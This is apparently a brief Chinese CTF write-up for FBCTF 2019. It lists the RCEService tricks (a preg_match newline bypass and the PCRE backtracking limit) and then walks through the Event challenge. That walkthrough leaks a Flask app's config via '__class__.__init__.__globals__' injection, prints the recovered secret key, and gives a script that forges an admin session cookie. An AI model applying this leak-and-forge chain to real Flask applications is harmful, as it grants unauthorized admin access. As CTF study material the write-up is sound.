# FBCTF 2019 

## RCEService

利用点：1. preg_match 换行绕过 2.prce 最大回溯限制

## Event

看cookie三段的，试了一下jwt发现含用户名字段，但是签名对不上
想办法伪造cookie

``event_important``存在注入回显点

```
__dict__
__class__.__init__.__globals__[app].config
```

拿到secretkey后伪造admin身份

```
fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y
```

检验下正确性
```
python flask_session_cookie_manager2.py decode -s 'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y' -c Ilx1MWQyY2RtaW4i.XogtiQ.GS-obKTyVRDwhI_27cLwIgxGrsc
ᴬdmin
```

然后用脚本签名

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = b'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y'

session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)

@app.route('/')
def index():
    print(session_serializer.dumps("admin"))

index()
```

注意使用python3